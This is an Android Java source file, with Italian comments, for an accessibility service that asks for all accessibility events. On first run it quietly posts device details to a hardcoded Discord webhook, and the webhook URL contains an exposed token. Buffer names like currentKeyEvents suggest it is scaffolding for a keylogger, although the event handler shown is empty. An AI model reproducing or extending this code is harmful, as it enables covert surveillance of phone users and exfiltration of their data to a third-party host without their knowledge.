package com;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1352988210212503652/D-7ykislImfMtSMG0IeIjHx7VrTjtu0JeMLMnnsRKn64NMPPE9wJMePky8e5Rs8daqcW";
    private static final int MAX_BUFFER_SIZE = 25;

    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Gestisci eventi di accessibilità se necessario
    }

    @Override
    public void onInterrupt() {
        // Gestisci l'interruzione
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Controlla se è la prima esecuzione
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            // Raccogli i dettagli del dispositivo
            String deviceDetails = getSYSInfo();

            // Invia le informazioni raccolte a Discord
            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToDiscordAndClear();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        return "Produttore: " + Build.MANUFACTURER + "\n" +
                "VERSIONE: " + Build.VERSION.RELEASE + "\n" +
                "NUMERO SDK: " + Build.VERSION.SDK_INT + "\n";
    }

    private void sendBufferToDiscordAndClear() {
        String log = currentKeyEvents.toString();

        new MessageSender().execute(log);
        currentKeyEvents.setLength(0); // Pulisci il buffer
    }

    private static class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";

        @Override
        protected Void doInBackground(String... strings) {
            String log = strings[0];

            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                JSONObject messageJSON = new JSONObject();
                messageJSON.put("content", "```\n" + log + "\n```");
                OutputStream os = connection.getOutputStream();
                os.write(messageJSON.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Messaggio inviato al canale Discord.");
                } else {
                    Log.e(TAG, "Invio del messaggio al canale Discord fallito. Codice di risposta: " + responseCode);
                }
                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "Creazione dell'oggetto JSON fallita: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Invio del messaggio al canale Discord fallito: " + e.getMessage());
            }
            return null;
        }
    }
}